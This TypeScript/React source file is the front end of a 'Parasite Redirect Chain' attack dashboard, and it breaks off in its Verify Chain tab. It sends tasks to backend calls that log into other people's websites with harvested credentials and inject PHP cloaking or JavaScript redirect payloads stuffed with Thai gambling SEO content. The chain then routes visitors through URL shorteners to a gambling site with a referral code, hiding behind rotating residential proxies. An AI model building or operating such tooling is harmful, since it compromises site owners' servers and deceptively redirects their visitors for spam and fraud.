import { useState, useCallback } from "react";
import { trpc } from "@/lib/trpc";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Badge } from "@/components/ui/badge";
import { Textarea } from "@/components/ui/textarea";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Switch } from "@/components/ui/switch";
import { toast } from "sonner";

// ═══════════════════════════════════════════════
//  Parasite Redirect Chain Dashboard
//  middlemanbar.com → t.ly → pgbet888x.com style
// ═══════════════════════════════════════════════

export default function ParasiteRedirectChainDashboard() {
  const [activeTab, setActiveTab] = useState("chain-builder");

  return (
    <div className="space-y-4">
      {/* Header */}
      <div className="flex items-center gap-3">
        <div className="p-2 rounded-lg bg-gradient-to-br from-purple-500/20 to-pink-500/20">
          <span className="text-2xl">🔗</span>
        </div>
        <div>
          <h2 className="text-xl font-bold text-white">Parasite Redirect Chain</h2>
          <p className="text-sm text-zinc-400">
            Parasite Domain → URL Shortener → Final Destination (middlemanbar.com → t.ly → pgbet888x.com style)
          </p>
        </div>
      </div>

      <Tabs value={activeTab} onValueChange={setActiveTab}>
        <TabsList className="bg-zinc-800/50 border border-zinc-700/50 flex-wrap h-auto gap-1 p-1">
          <TabsTrigger value="chain-builder" className="text-xs">🔗 Chain Builder</TabsTrigger>
          <TabsTrigger value="short-url" className="text-xs">🔗 Short URL</TabsTrigger>
          <TabsTrigger value="payload-gen" className="text-xs">📄 Payload Gen</TabsTrigger>
          <TabsTrigger value="ai-content" className="text-xs">🤖 AI Content</TabsTrigger>
          <TabsTrigger value="proxy-mgr" className="text-xs">🌐 Proxy Manager</TabsTrigger>
          <TabsTrigger value="verify" className="text-xs">✅ Verify Chain</TabsTrigger>
          <TabsTrigger value="jobs" className="text-xs">📋 Jobs</TabsTrigger>
        </TabsList>

        {/* ─── Tab 1: Chain Builder ─── */}
        <TabsContent value="chain-builder"><ChainBuilderTab /></TabsContent>

        {/* ─── Tab 2: Short URL Creator ─── */}
        <TabsContent value="short-url"><ShortUrlTab /></TabsContent>

        {/* ─── Tab 3: Payload Generator ─── */}
        <TabsContent value="payload-gen"><PayloadGenTab /></TabsContent>

        {/* ─── Tab 4: AI Content ─── */}
        <TabsContent value="ai-content"><AiContentTab /></TabsContent>

        {/* ─── Tab 5: Proxy Manager ─── */}
        <TabsContent value="proxy-mgr"><ProxyManagerTab /></TabsContent>

        {/* ─── Tab 6: Verify Chain ─── */}
        <TabsContent value="verify"><VerifyChainTab /></TabsContent>

        {/* ─── Tab 7: Jobs ─── */}
        <TabsContent value="jobs"><JobsTab /></TabsContent>
      </Tabs>
    </div>
  );
}

// ═══════════════════════════════════════════════
//  Tab 1: Chain Builder — Full Attack Pipeline
// ═══════════════════════════════════════════════

function ChainBuilderTab() {
  const [parasiteDomain, setParasiteDomain] = useState("");
  const [parasitePath, setParasitePath] = useState("/");
  const [finalDestUrl, setFinalDestUrl] = useState("");
  const [referralCode, setReferralCode] = useState("");
  const [shortenerService, setShortenerService] = useState<string>("isgd");
  const [shortenerApiKey, setShortenerApiKey] = useState("");
  const [keywords, setKeywords] = useState("");
  const [credentials, setCredentials] = useState("");
  const [useProxy, setUseProxy] = useState(true);
  const [enableCloaking, setEnableCloaking] = useState(true);
  const [language, setLanguage] = useState<string>("th");
  const [contentStyle, setContentStyle] = useState<string>("gambling");
  const [jobId, setJobId] = useState<string | null>(null);

  const executeChain = trpc.parasiteRedirectChain.executeChain.useMutation({
    onSuccess: (data) => {
      setJobId(data.jobId);
      toast.success(`Chain Attack Started: ${data.jobId}`);
    },
    onError: (err) => toast.error(err.message),
  });

  const jobStatus = trpc.parasiteRedirectChain.getJobStatus.useQuery(
    { jobId: jobId || "" },
    { enabled: !!jobId, refetchInterval: jobId ? 2000 : false }
  );

  const handleExecute = () => {
    const parsedCreds = credentials.trim()
      ? credentials.split("\n").map(line => {
          const [username, password] = line.split(":");
          return { username: username?.trim() || "", password: password?.trim() || "" };
        }).filter(c => c.username && c.password)
      : undefined;

    executeChain.mutate({
      parasiteDomain,
      parasitePath,
      finalDestUrl,
      referralCode: referralCode || undefined,
      keywords: keywords.split(",").map(k => k.trim()).filter(Boolean),
      shortenerService: shortenerService as any,
      shortenerApiKey: shortenerApiKey || undefined,
      credentials: parsedCreds,
      useProxy,
      enableCloaking,
      language: language as any,
      contentStyle: contentStyle as any,
    });
  };

  const job = jobStatus.data;

  return (
    <div className="space-y-4">
      {/* Chain Visualization */}
      <Card className="bg-gradient-to-r from-purple-900/30 via-pink-900/30 to-red-900/30 border-purple-500/30">
        <CardContent className="pt-4">
          <div className="flex items-center justify-center gap-2 text-sm flex-wrap">
            <Badge variant="outline" className="border-purple-500 text-purple-300 px-3 py-1">
              {parasiteDomain || "parasite.com"}{parasitePath}
            </Badge>
            <span className="text-zinc-500">→</span>
            <Badge variant="outline" className="border-blue-500 text-blue-300 px-3 py-1">
              {shortenerService === "direct" ? "Direct" : shortenerService.toUpperCase()}
            </Badge>
            <span className="text-zinc-500">→</span>
            <Badge variant="outline" className="border-green-500 text-green-300 px-3 py-1">
              {finalDestUrl || "target.com"}{referralCode ? `?rc=${referralCode}` : ""}
            </Badge>
          </div>
        </CardContent>
      </Card>

      <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
        {/* Config */}
        <Card className="bg-zinc-900/50 border-zinc-700/50">
          <CardHeader className="pb-3">
            <CardTitle className="text-sm text-white">Attack Configuration</CardTitle>
          </CardHeader>
          <CardContent className="space-y-3">
            <div className="grid grid-cols-2 gap-3">
              <div>
                <Label className="text-xs text-zinc-400">Parasite Domain</Label>
                <Input value={parasiteDomain} onChange={e => setParasiteDomain(e.target.value)}
                  placeholder="middlemanbar.com" className="bg-zinc-800 border-zinc-700 text-sm" />
              </div>
              <div>
                <Label className="text-xs text-zinc-400">Path</Label>
                <Input value={parasitePath} onChange={e => setParasitePath(e.target.value)}
                  placeholder="/menu" className="bg-zinc-800 border-zinc-700 text-sm" />
              </div>
            </div>

            <div className="grid grid-cols-2 gap-3">
              <div>
                <Label className="text-xs text-zinc-400">Final Destination URL</Label>
                <Input value={finalDestUrl} onChange={e => setFinalDestUrl(e.target.value)}
                  placeholder="https://pgbet888x.com" className="bg-zinc-800 border-zinc-700 text-sm" />
              </div>
              <div>
                <Label className="text-xs text-zinc-400">Referral Code</Label>
                <Input value={referralCode} onChange={e => setReferralCode(e.target.value)}
                  placeholder="dj2222" className="bg-zinc-800 border-zinc-700 text-sm" />
              </div>
            </div>

            <div className="grid grid-cols-2 gap-3">
              <div>
                <Label className="text-xs text-zinc-400">URL Shortener</Label>
                <Select value={shortenerService} onValueChange={setShortenerService}>
                  <SelectTrigger className="bg-zinc-800 border-zinc-700 text-sm">
                    <SelectValue />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="isgd">is.gd (Free)</SelectItem>
                    <SelectItem value="vgd">v.gd (Free)</SelectItem>
                    <SelectItem value="clckru">clck.ru (Free)</SelectItem>
                    <SelectItem value="tly">t.ly (API Key)</SelectItem>
                    <SelectItem value="bitly">bit.ly (API Key)</SelectItem>
                    <SelectItem value="direct">Direct (No Shortener)</SelectItem>
                  </SelectContent>
                </Select>
              </div>
              <div>
                <Label className="text-xs text-zinc-400">API Key (if needed)</Label>
                <Input value={shortenerApiKey} onChange={e => setShortenerApiKey(e.target.value)}
                  placeholder="Optional" className="bg-zinc-800 border-zinc-700 text-sm" type="password" />
              </div>
            </div>

            <div className="grid grid-cols-2 gap-3">
              <div>
                <Label className="text-xs text-zinc-400">Language</Label>
                <Select value={language} onValueChange={setLanguage}>
                  <SelectTrigger className="bg-zinc-800 border-zinc-700 text-sm"><SelectValue /></SelectTrigger>
                  <SelectContent>
                    <SelectItem value="th">Thai</SelectItem>
                    <SelectItem value="en">English</SelectItem>
                    <SelectItem value="auto">Auto</SelectItem>
                  </SelectContent>
                </Select>
              </div>
              <div>
                <Label className="text-xs text-zinc-400">Content Style</Label>
                <Select value={contentStyle} onValueChange={setContentStyle}>
                  <SelectTrigger className="bg-zinc-800 border-zinc-700 text-sm"><SelectValue /></SelectTrigger>
                  <SelectContent>
                    <SelectItem value="gambling">Gambling</SelectItem>
                    <SelectItem value="crypto">Crypto</SelectItem>
                    <SelectItem value="ecommerce">E-Commerce</SelectItem>
                    <SelectItem value="generic">Generic</SelectItem>
                  </SelectContent>
                </Select>
              </div>
            </div>

            <div>
              <Label className="text-xs text-zinc-400">Keywords (comma separated)</Label>
              <Input value={keywords} onChange={e => setKeywords(e.target.value)}
                placeholder="เว็บตรง, สล็อต, pgbet888" className="bg-zinc-800 border-zinc-700 text-sm" />
            </div>

            <div>
              <Label className="text-xs text-zinc-400">Credentials (username:password per line)</Label>
              <Textarea value={credentials} onChange={e => setCredentials(e.target.value)}
                placeholder="admin:password123&#10;editor:secret456" className="bg-zinc-800 border-zinc-700 text-sm h-16" />
            </div>

            <div className="flex items-center gap-6">
              <div className="flex items-center gap-2">
                <Switch checked={useProxy} onCheckedChange={setUseProxy} />
                <Label className="text-xs text-zinc-400">Use Thai Proxy</Label>
              </div>
              <div className="flex items-center gap-2">
                <Switch checked={enableCloaking} onCheckedChange={setEnableCloaking} />
                <Label className="text-xs text-zinc-400">Enable Cloaking</Label>
              </div>
            </div>

            <Button onClick={handleExecute} disabled={!parasiteDomain || !finalDestUrl || executeChain.isPending}
              className="w-full bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-500 hover:to-pink-500">
              {executeChain.isPending ? "Starting..." : "🚀 Execute Redirect Chain Attack"}
            </Button>
          </CardContent>
        </Card>

        {/* Job Progress & Result */}
        <Card className="bg-zinc-900/50 border-zinc-700/50">
          <CardHeader className="pb-3">
            <CardTitle className="text-sm text-white">Attack Progress</CardTitle>
          </CardHeader>
          <CardContent>
            {!job || !job.found ? (
              <div className="text-center text-zinc-500 py-8">
                <p className="text-4xl mb-2">🔗</p>
                <p>Configure and execute an attack to see progress</p>
              </div>
            ) : (
              <div className="space-y-3">
                <div className="flex items-center gap-2">
                  <Badge variant={job.status === "done" ? "default" : job.status === "running" ? "secondary" : "destructive"}>
                    {job.status === "done" ? "✅ Complete" : job.status === "running" ? "⏳ Running" : "❌ Failed"}
                  </Badge>
                  <span className="text-xs text-zinc-400">{((job.durationMs || 0) / 1000).toFixed(1)}s</span>
                </div>

                {/* Progress log */}
                <div className="bg-black/50 rounded-lg p-3 max-h-48 overflow-y-auto font-mono text-xs space-y-1">
                  {(job.progress || []).map((p: any, i: number) => (
                    <div key={i} className="text-zinc-300">
                      <span className="text-purple-400">[{p.phase}]</span> {p.detail}
                    </div>
                  ))}
                  {job.status === "running" && (
                    <div className="text-yellow-400 animate-pulse">Processing...</div>
                  )}
                </div>

                {/* Result */}
                {job.result && (
                  <div className="space-y-2">
                    {/* Chain visualization */}
                    {job.result.chain && job.result.chain.length > 0 && (
                      <div className="bg-zinc-800/50 rounded-lg p-3">
                        <p className="text-xs text-zinc-400 mb-2">Redirect Chain:</p>
                        <div className="flex items-center gap-1 flex-wrap">
                          {job.result.chain.map((url: string, i: number) => (
                            <div key={i} className="flex items-center gap-1">
                              <Badge variant="outline" className="text-xs border-zinc-600 max-w-[200px] truncate">
                                {url}
                              </Badge>
                              {i < (job.result!.chain?.length || 0) - 1 && <span className="text-zinc-500">→</span>}
                            </div>
                          ))}
                        </div>
                      </div>
                    )}

                    {/* Short URL */}
                    {job.result.shortUrl?.success && (
                      <div className="bg-blue-900/20 rounded-lg p-2 border border-blue-500/30">
                        <p className="text-xs text-blue-300">Short URL: <span className="text-white font-mono">{job.result.shortUrl.shortUrl}</span></p>
                      </div>
                    )}

                    {/* Injection */}
                    {job.result.injectionResult && (
                      <div className={`rounded-lg p-2 border ${job.result.injectionResult.success ? "bg-green-900/20 border-green-500/30" : "bg-red-900/20 border-red-500/30"}`}>
                        <p className="text-xs">
                          {job.result.injectionResult.success ? "✅" : "❌"} Injection ({job.result.injectionResult.method}): {job.result.injectionResult.detail}
                        </p>
                      </div>
                    )}

                    {/* Verification */}
                    {job.result.verificationResult && (
                      <div className={`rounded-lg p-2 border ${job.result.verificationResult.success ? "bg-green-900/20 border-green-500/30" : "bg-yellow-900/20 border-yellow-500/30"}`}>
                        <p className="text-xs">
                          {job.result.verificationResult.success ? "✅" : "⚠️"} {job.result.verificationResult.detail}
                        </p>
                      </div>
                    )}
                  </div>
                )}
              </div>
            )}
          </CardContent>
        </Card>
      </div>
    </div>
  );
}

// ═══════════════════════════════════════════════
//  Tab 2: Short URL Creator
// ═══════════════════════════════════════════════

function ShortUrlTab() {
  const [longUrl, setLongUrl] = useState("");
  const [service, setService] = useState<string>("isgd");
  const [apiKey, setApiKey] = useState("");
  const [useProxy, setUseProxy] = useState(true);
  const [result, setResult] = useState<any>(null);
  const [bulkUrls, setBulkUrls] = useState("");
  const [bulkResults, setBulkResults] = useState<any[]>([]);

  const createShort = trpc.parasiteRedirectChain.createShortUrl.useMutation({
    onSuccess: (data) => {
      setResult(data);
      if (data.success) toast.success(`Short URL: ${data.shortUrl}`);
      else toast.error(data.error || "Failed");
    },
  });

  const createBulk = trpc.parasiteRedirectChain.createBulkShortUrls.useMutation({
    onSuccess: (data) => {
      setBulkResults(data);
      const success = data.filter((r: any) => r.success).length;
      toast.success(`Bulk: ${success}/${data.length} created`);
    },
  });

  return (
    <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
      {/* Single URL */}
      <Card className="bg-zinc-900/50 border-zinc-700/50">
        <CardHeader className="pb-3">
          <CardTitle className="text-sm text-white">Single Short URL</CardTitle>
          <CardDescription className="text-xs">สร้าง short URL จริงผ่าน API</CardDescription>
        </CardHeader>
        <CardContent className="space-y-3">
          <div>
            <Label className="text-xs text-zinc-400">Long URL</Label>
            <Input value={longUrl} onChange={e => setLongUrl(e.target.value)}
              placeholder="https://pgbet888x.com/?rc=dj2222" className="bg-zinc-800 border-zinc-700 text-sm" />
          </div>
          <div className="grid grid-cols-2 gap-3">
            <div>
              <Label className="text-xs text-zinc-400">Service</Label>
              <Select value={service} onValueChange={setService}>
                <SelectTrigger className="bg-zinc-800 border-zinc-700 text-sm"><SelectValue /></SelectTrigger>
                <SelectContent>
                  <SelectItem value="isgd">is.gd (Free)</SelectItem>
                  <SelectItem value="vgd">v.gd (Free)</SelectItem>
                  <SelectItem value="clckru">clck.ru (Free)</SelectItem>
                  <SelectItem value="tly">t.ly (API Key)</SelectItem>
                  <SelectItem value="bitly">bit.ly (API Key)</SelectItem>
                </SelectContent>
              </Select>
            </div>
            <div>
              <Label className="text-xs text-zinc-400">API Key</Label>
              <Input value={apiKey} onChange={e => setApiKey(e.target.value)}
                placeholder="Optional" className="bg-zinc-800 border-zinc-700 text-sm" type="password" />
            </div>
          </div>
          <div className="flex items-center gap-2">
            <Switch checked={useProxy} onCheckedChange={setUseProxy} />
            <Label className="text-xs text-zinc-400">Use Thai Proxy</Label>
          </div>
          <Button onClick={() => createShort.mutate({ longUrl, service: service as any, apiKey: apiKey || undefined, useProxy })}
            disabled={!longUrl || createShort.isPending} className="w-full bg-blue-600 hover:bg-blue-500">
            {createShort.isPending ? "Creating..." : "🔗 Create Short URL"}
          </Button>

          {result && (
            <div className={`rounded-lg p-3 border ${result.success ? "bg-green-900/20 border-green-500/30" : "bg-red-900/20 border-red-500/30"}`}>
              {result.success ? (
                <div>
                  <p className="text-xs text-green-300 mb-1">Created via {result.service}:</p>
                  <p className="text-sm text-white font-mono break-all">{result.shortUrl}</p>
                </div>
              ) : (
                <p className="text-xs text-red-300">Error: {result.error}</p>
              )}
            </div>
          )}
        </CardContent>
      </Card>

      {/* Bulk URLs */}
      <Card className="bg-zinc-900/50 border-zinc-700/50">
        <CardHeader className="pb-3">
          <CardTitle className="text-sm text-white">Bulk Short URLs</CardTitle>
          <CardDescription className="text-xs">สร้าง short URL หลายตัวพร้อมกัน (สูงสุด 100)</CardDescription>
        </CardHeader>
        <CardContent className="space-y-3">
          <div>
            <Label className="text-xs text-zinc-400">URLs (one per line)</Label>
            <Textarea value={bulkUrls} onChange={e => setBulkUrls(e.target.value)}
              placeholder="https://pgbet888x.com/?rc=dj2222&#10;https://pgbet888x.com/?rc=abc123"
              className="bg-zinc-800 border-zinc-700 text-sm h-24" />
          </div>
          <Button onClick={() => {
            const urls = bulkUrls.split("\n").map(u => u.trim()).filter(u => u.startsWith("http"));
            createBulk.mutate({ longUrls: urls, service: service as any, apiKey: apiKey || undefined, useProxy });
          }} disabled={!bulkUrls.trim() || createBulk.isPending} className="w-full bg-purple-600 hover:bg-purple-500">
            {createBulk.isPending ? "Creating..." : "🔗 Create Bulk Short URLs"}
          </Button>

          {bulkResults.length > 0 && (
            <div className="bg-black/50 rounded-lg p-3 max-h-48 overflow-y-auto space-y-1">
              {bulkResults.map((r: any, i: number) => (
                <div key={i} className="flex items-center gap-2 text-xs">
                  <span>{r.success ? "✅" : "❌"}</span>
                  <span className="text-zinc-400 truncate max-w-[150px]">{r.originalUrl}</span>
                  <span className="text-zinc-500">→</span>
                  <span className="text-white font-mono">{r.success ? r.shortUrl : r.error}</span>
                </div>
              ))}
            </div>
          )}
        </CardContent>
      </Card>
    </div>
  );
}

// ═══════════════════════════════════════════════
//  Tab 3: Payload Generator
// ═══════════════════════════════════════════════

function PayloadGenTab() {
  const [redirectUrl, setRedirectUrl] = useState("");
  const [keywords, setKeywords] = useState("");
  const [language, setLanguage] = useState<string>("th");
  const [contentStyle, setContentStyle] = useState<string>("gambling");
  const [enableCloaking, setEnableCloaking] = useState(true);
  const [payload, setPayload] = useState<any>(null);
  const [payloadType, setPayloadType] = useState<"php" | "html">("php");

  const genPhp = trpc.parasiteRedirectChain.generatePayload.useMutation({
    onSuccess: (data) => { setPayload(data); toast.success("PHP Payload Generated"); },
  });

  const genHtml = trpc.parasiteRedirectChain.generateHtmlPayload.useMutation({
    onSuccess: (data) => { setPayload(data); toast.success("HTML Payload Generated"); },
  });

  const handleGenerate = () => {
    const kw = keywords.split(",").map(k => k.trim()).filter(Boolean);
    if (payloadType === "php") {
      genPhp.mutate({ redirectUrl, keywords: kw, language: language as any, contentStyle: contentStyle as any, conditionalRedirect: enableCloaking });
    } else {
      genHtml.mutate({ redirectUrl, keywords: kw, language: language as any, contentStyle: contentStyle as any });
    }
  };

  return (
    <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
      <Card className="bg-zinc-900/50 border-zinc-700/50">
        <CardHeader className="pb-3">
          <CardTitle className="text-sm text-white">Generate Parasite SEO Payload</CardTitle>
          <CardDescription className="text-xs">สร้าง payload ที่มี SEO content + conditional redirect</CardDescription>
        </CardHeader>
        <CardContent className="space-y-3">
          <div>
            <Label className="text-xs text-zinc-400">Redirect URL (short URL or final)</Label>
            <Input value={redirectUrl} onChange={e => setRedirectUrl(e.target.value)}
              placeholder="https://is.gd/xxxxx" className="bg-zinc-800 border-zinc-700 text-sm" />
          </div>
          <div>
            <Label className="text-xs text-zinc-400">Keywords</Label>
            <Input value={keywords} onChange={e => setKeywords(e.target.value)}
              placeholder="เว็บตรง, สล็อต, pgbet888" className="bg-zinc-800 border-zinc-700 text-sm" />
          </div>
          <div className="grid grid-cols-3 gap-3">
            <div>
              <Label className="text-xs text-zinc-400">Type</Label>
              <Select value={payloadType} onValueChange={v => setPayloadType(v as any)}>
                <SelectTrigger className="bg-zinc-800 border-zinc-700 text-sm"><SelectValue /></SelectTrigger>
                <SelectContent>
                  <SelectItem value="php">PHP (Cloaking)</SelectItem>
                  <SelectItem value="html">HTML (JS Redirect)</SelectItem>
                </SelectContent>
              </Select>
            </div>
            <div>
              <Label className="text-xs text-zinc-400">Language</Label>
              <Select value={language} onValueChange={setLanguage}>
                <SelectTrigger className="bg-zinc-800 border-zinc-700 text-sm"><SelectValue /></SelectTrigger>
                <SelectContent>
                  <SelectItem value="th">Thai</SelectItem>
                  <SelectItem value="en">English</SelectItem>
                </SelectContent>
              </Select>
            </div>
            <div>
              <Label className="text-xs text-zinc-400">Style</Label>
              <Select value={contentStyle} onValueChange={setContentStyle}>
                <SelectTrigger className="bg-zinc-800 border-zinc-700 text-sm"><SelectValue /></SelectTrigger>
                <SelectContent>
                  <SelectItem value="gambling">Gambling</SelectItem>
                  <SelectItem value="crypto">Crypto</SelectItem>
                  <SelectItem value="ecommerce">E-Commerce</SelectItem>
                </SelectContent>
              </Select>
            </div>
          </div>
          <div className="flex items-center gap-2">
            <Switch checked={enableCloaking} onCheckedChange={setEnableCloaking} />
            <Label className="text-xs text-zinc-400">Conditional Redirect (Cloaking)</Label>
          </div>
          <Button onClick={handleGenerate} disabled={!redirectUrl || genPhp.isPending || genHtml.isPending}
            className="w-full bg-orange-600 hover:bg-orange-500">
            {(genPhp.isPending || genHtml.isPending) ? "Generating..." : "📄 Generate Payload"}
          </Button>
        </CardContent>
      </Card>

      {/* Payload Output */}
      <Card className="bg-zinc-900/50 border-zinc-700/50">
        <CardHeader className="pb-3">
          <CardTitle className="text-sm text-white">Generated Payload</CardTitle>
          {payload && (
            <div className="flex gap-2 flex-wrap">
              <Badge variant="outline" className="text-xs">{payload.filename}</Badge>
              <Badge variant="outline" className="text-xs">{payload.wordCount} words</Badge>
              <Badge variant="outline" className="text-xs">SEO: {payload.seoScore}/100</Badge>
            </div>
          )}
        </CardHeader>
        <CardContent>
          {payload ? (
            <div className="space-y-2">
              <div className="bg-black/50 rounded-lg p-3 max-h-96 overflow-y-auto">
                <pre className="text-xs text-green-300 whitespace-pre-wrap break-all font-mono">
                  {payload.content?.substring(0, 5000)}
                  {(payload.content?.length || 0) > 5000 && "\n\n... (truncated)"}
                </pre>
              </div>
              <Button onClick={() => {
                navigator.clipboard.writeText(payload.content || "");
                toast.success("Copied to clipboard");
              }} variant="outline" className="w-full text-xs">
                📋 Copy Full Payload
              </Button>
            </div>
          ) : (
            <div className="text-center text-zinc-500 py-12">
              <p className="text-4xl mb-2">📄</p>
              <p>Generate a payload to see it here</p>
            </div>
          )}
        </CardContent>
      </Card>
    </div>
  );
}

// ═══════════════════════════════════════════════
//  Tab 4: AI Content Generator
// ═══════════════════════════════════════════════

function AiContentTab() {
  const [keywords, setKeywords] = useState("เว็บตรง, สล็อต, pgbet888");
  const [style, setStyle] = useState<string>("gambling");
  const [wordCount, setWordCount] = useState(1500);
  const [result, setResult] = useState<any>(null);

  const generate = trpc.parasiteRedirectChain.generateAiContent.useMutation({
    onSuccess: (data) => { setResult(data); toast.success("AI Content Generated"); },
    onError: (err) => toast.error(err.message),
  });

  return (
    <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
      <Card className="bg-zinc-900/50 border-zinc-700/50">
        <CardHeader className="pb-3">
          <CardTitle className="text-sm text-white">AI SEO Content Generator</CardTitle>
          <CardDescription className="text-xs">สร้างเนื้อหา SEO ภาษาไทยด้วย AI (LLM)</CardDescription>
        </CardHeader>
        <CardContent className="space-y-3">
          <div>
            <Label className="text-xs text-zinc-400">Keywords</Label>
            <Input value={keywords} onChange={e => setKeywords(e.target.value)}
              placeholder="เว็บตรง, สล็อต, pgbet888" className="bg-zinc-800 border-zinc-700 text-sm" />
          </div>
          <div className="grid grid-cols-2 gap-3">
            <div>
              <Label className="text-xs text-zinc-400">Style</Label>
              <Select value={style} onValueChange={setStyle}>
                <SelectTrigger className="bg-zinc-800 border-zinc-700 text-sm"><SelectValue /></SelectTrigger>
                <SelectContent>
                  <SelectItem value="gambling">Gambling</SelectItem>
                  <SelectItem value="crypto">Crypto</SelectItem>
                  <SelectItem value="ecommerce">E-Commerce</SelectItem>
                  <SelectItem value="generic">Generic</SelectItem>
                </SelectContent>
              </Select>
            </div>
            <div>
              <Label className="text-xs text-zinc-400">Word Count</Label>
              <Input type="number" value={wordCount} onChange={e => setWordCount(Number(e.target.value))}
                min={500} max={5000} className="bg-zinc-800 border-zinc-700 text-sm" />
            </div>
          </div>
          <Button onClick={() => generate.mutate({
            keywords: keywords.split(",").map(k => k.trim()).filter(Boolean),
            style: style as any,
            wordCount,
          })} disabled={generate.isPending} className="w-full bg-green-600 hover:bg-green-500">
            {generate.isPending ? "Generating with AI..." : "🤖 Generate AI Content"}
          </Button>
        </CardContent>
      </Card>

      <Card className="bg-zinc-900/50 border-zinc-700/50">
        <CardHeader className="pb-3">
          <CardTitle className="text-sm text-white">Generated Content</CardTitle>
        </CardHeader>
        <CardContent>
          {result ? (
            <div className="space-y-3">
              <div className="bg-purple-900/20 rounded-lg p-3 border border-purple-500/30">
                <p className="text-xs text-purple-300 mb-1">Title:</p>
                <p className="text-sm text-white font-semibold">{result.title}</p>
              </div>
              <div className="bg-blue-900/20 rounded-lg p-3 border border-blue-500/30">
                <p className="text-xs text-blue-300 mb-1">Meta Description:</p>
                <p className="text-sm text-white">{result.metaDescription}</p>
              </div>
              <div className="bg-black/50 rounded-lg p-3 max-h-48 overflow-y-auto">
                <div className="text-xs text-zinc-300" dangerouslySetInnerHTML={{ __html: result.content?.substring(0, 3000) || "" }} />
              </div>
              {result.faqItems?.length > 0 && (
                <div className="bg-zinc-800/50 rounded-lg p-3">
                  <p className="text-xs text-zinc-400 mb-2">FAQ ({result.faqItems.length} items):</p>
                  {result.faqItems.map((faq: any, i: number) => (
                    <div key={i} className="mb-2">
                      <p className="text-xs text-white font-semibold">Q: {faq.q}</p>
                      <p className="text-xs text-zinc-400">A: {faq.a}</p>
                    </div>
                  ))}
                </div>
              )}
            </div>
          ) : (
            <div className="text-center text-zinc-500 py-12">
              <p className="text-4xl mb-2">🤖</p>
              <p>Generate AI content to see it here</p>
            </div>
          )}
        </CardContent>
      </Card>
    </div>
  );
}

// ═══════════════════════════════════════════════
//  Tab 5: Proxy Manager
// ═══════════════════════════════════════════════

function ProxyManagerTab() {
  const proxyList = trpc.parasiteRedirectChain.getProxyList.useQuery();
  const proxyStats = trpc.parasiteRedirectChain.getProxyStats.useQuery();
  const testAll = trpc.parasiteRedirectChain.testAllProxies.useMutation({
    onSuccess: (data) => {
      toast.success(`Proxy Test: ${data.alive}/${data.total} alive, avg ${data.avgLatency}ms`);
    },
  });
  const testSingle = trpc.parasiteRedirectChain.testProxy.useMutation();

  return (
    <div className="space-y-4">
      {/* Stats */}
      <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
        <Card className="bg-zinc-900/50 border-zinc-700/50">
          <CardContent className="pt-4 text-center">
            <p className="text-2xl font-bold text-white">{proxyList.data?.length || 0}</p>
            <p className="text-xs text-zinc-400">Total Proxies</p>
          </CardContent>
        </Card>
        <Card className="bg-zinc-900/50 border-zinc-700/50">
          <CardContent className="pt-4 text-center">
            <p className="text-2xl font-bold text-green-400">{testAll.data?.alive || "—"}</p>
            <p className="text-xs text-zinc-400">Alive</p>
          </CardContent>
        </Card>
        <Card className="bg-zinc-900/50 border-zinc-700/50">
          <CardContent className="pt-4 text-center">
            <p className="text-2xl font-bold text-red-400">{testAll.data?.dead || "—"}</p>
            <p className="text-xs text-zinc-400">Dead</p>
          </CardContent>
        </Card>
        <Card className="bg-zinc-900/50 border-zinc-700/50">
          <CardContent className="pt-4 text-center">
            <p className="text-2xl font-bold text-blue-400">{testAll.data?.avgLatency || "—"}ms</p>
            <p className="text-xs text-zinc-400">Avg Latency</p>
          </CardContent>
        </Card>
      </div>

      <Button onClick={() => testAll.mutate()} disabled={testAll.isPending}
        className="bg-blue-600 hover:bg-blue-500">
        {testAll.isPending ? "Testing..." : "🔍 Test All Proxies"}
      </Button>

      {/* Proxy List */}
      <Card className="bg-zinc-900/50 border-zinc-700/50">
        <CardHeader className="pb-3">
          <CardTitle className="text-sm text-white">Thai Residential Proxies ({proxyList.data?.length || 0})</CardTitle>
        </CardHeader>
        <CardContent>
          <div className="bg-black/50 rounded-lg max-h-96 overflow-y-auto">
            <table className="w-full text-xs">
              <thead className="text-zinc-400 border-b border-zinc-700">
                <tr>
                  <th className="text-left p-2">#</th>
                  <th className="text-left p-2">Host</th>
                  <th className="text-left p-2">Port</th>
                  <th className="text-left p-2">Status</th>
                  <th className="text-left p-2">Latency</th>
                </tr>
              </thead>
              <tbody>
                {(proxyList.data || []).map((proxy: any) => {
                  const testResult = testAll.data?.results?.find((r: any) => r.index === proxy.index);
                  return (
                    <tr key={proxy.index} className="border-b border-zinc-800 hover:bg-zinc-800/50">
                      <td className="p-2 text-zinc-500">{proxy.index + 1}</td>
                      <td className="p-2 text-white font-mono">{proxy.host}</td>
                      <td className="p-2 text-zinc-400">{proxy.port}</td>
                      <td className="p-2">
                        {testResult ? (
                          <Badge variant={testResult.ok ? "default" : "destructive"} className="text-xs">
                            {testResult.ok ? "✅ Alive" : "❌ Dead"}
                          </Badge>
                        ) : (
                          <Badge variant="outline" className="text-xs">Unknown</Badge>
                        )}
                      </td>
                      <td className="p-2 text-zinc-400">{testResult?.latencyMs ? `${testResult.latencyMs}ms` : "—"}</td>
                    </tr>
                  );
                })}
              </tbody>
            </table>
          </div>
        </CardContent>
      </Card>
    </div>
  );
}

// ═══════════════════════════════════════════════
//  Tab 6: Verify Chain
// ═══════════════════════════════════════════════

function VerifyChainTab() {
  const [startUrl, setStartUrl] = useState("");
  const [expectedFinal, setExpectedFinal] = useState("");
  const [useProxy, setUseProxy] = useState(true);
  const [result, setResult] = useState<any>(null);

  const verify = trpc.parasiteRedirectChain.verifyChain.useMutation({
    onSuccess: (data) => {
      setResult(data);
      data.success ? toast.success("Chain Verified!") : toast.info("Chain Incomplete");
    },
  });

  return (
    <Card className="bg-zinc-900/50 border-zinc-700/50">
      <CardHeader className="pb-3">
